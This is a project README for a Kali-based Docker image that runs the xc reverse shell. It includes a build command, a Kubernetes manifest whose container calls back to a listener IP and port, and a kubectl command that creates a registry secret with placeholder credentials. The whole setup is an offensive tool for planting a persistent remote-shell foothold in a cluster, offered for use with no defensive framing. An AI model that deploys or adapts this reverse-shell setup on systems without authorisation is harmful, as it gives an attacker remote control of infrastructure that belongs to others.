# docker-reverse-kali

This is a simple Kali based Docker image with a reverse shell. The reverse shell used is [xc](https://github.com/xct/xc).

Build it, `docker build -t whatever .`

To deploy it anywhere you need to upload it to a registry. [Here's a good tutorial](https://gabrieltanner.org/blog/docker-registry) on how to run your own Docker registry.

## Why?

idk? Deploy this anywhere to have a Kali that connects back to an XC listener. For example, in Kubernetes,

```
apiVersion: v1
kind: Namespace
metadata:
  name: rshell
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: rshell
  namespace: rshell
spec:
  selector:
    matchLabels:
      app: rshell
  template:
    metadata:
      labels:
        app: rshell
    spec:
      containers:
      - name: rshell
        image: your.private.docker.registry/rshell-kali
        command: ["/xc/xc"]
        args: ["192.168.1.100", "1337"] # your listener ip and port
      imagePullSecrets:
      - name: rshell-dr-secret
---
apiVersion: v1
kind: Service
metadata:
  name: rshell-entrypoint
  namespace: rshell
spec:
  selector:
    app: rshell
  ports:
  - port: 80
    targetPort: 8888
  type: LoadBalancer
```

(and create the secret too)

```
kubectl create secret -n rshell docker-registry rshell-dr-secret --docker-server=your.private.docker.registry --docker-username=john --docker-password=pass --docker-email=john@kali
```
